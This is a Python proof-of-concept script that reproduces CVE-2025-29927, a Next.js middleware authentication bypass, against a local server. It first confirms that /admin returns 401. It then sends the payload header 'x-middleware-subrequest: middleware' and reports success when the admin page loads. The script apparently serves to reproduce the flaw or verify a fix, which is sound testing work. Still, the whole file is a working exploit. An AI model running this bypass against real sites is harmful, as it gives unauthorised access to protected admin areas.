import requests
import sys
import time

TARGET_URL = "http://localhost:3000/admin"

def wait_for_server():
    print("[*] Waiting for server to start...")
    for i in range(30):
        try:
            requests.get("http://localhost:3000", timeout=2)
            print("[*] Server is up!")
            return True
        except:
            time.sleep(2)
            print(".", end="", flush=True)
    print("\n[!] Server failed to start.")
    return False

def test_bypass():
    print(f"\n[*] Testing plain request to {TARGET_URL} (Expect 401)")
    try:
        res = requests.get(TARGET_URL)
        print(f"Status Code: {res.status_code}")
        if res.status_code == 401:
            print("[+] Middleware blocked access as expected.")
        else:
            print(f"[-] Unexpected status code: {res.status_code}")
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

    print("-" * 30)

    # Bypass Payload
    # The vulnerability allows bypassing middleware if x-middleware-subrequest header is present
    headers = {
        "x-middleware-subrequest": "middleware" 
    }
    
    print(f"[*] Testing bypass request to {TARGET_URL} with header x-middleware-subrequest: middleware")
    try:
        res = requests.get(TARGET_URL, headers=headers)
        print(f"Status Code: {res.status_code}")
        # If bypassed, we should see the Admin Page content (200 OK)
        if res.status_code == 200 and "Admin Page" in res.text:
            print("[+] Bypass Successful! Accessed Admin Page.")
            return True
        else:
            print(f"[-] Bypass Failed. Status: {res.status_code}")
            # If we get 401, it means the fix works or middleware is still active
            # If we get 404, the page might not exist?
            print(f"Response snippet: {res.text[:200]}")
            return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

if __name__ == "__main__":
    if not wait_for_server():
        sys.exit(1)
        
    if test_bypass():
        print("[SUCCESS] CVE-2025-29927 reproduced.")
        sys.exit(0)
    else:
        print("[FAILURE] Could not reproduce CVE-2025-29927.")
        sys.exit(1)
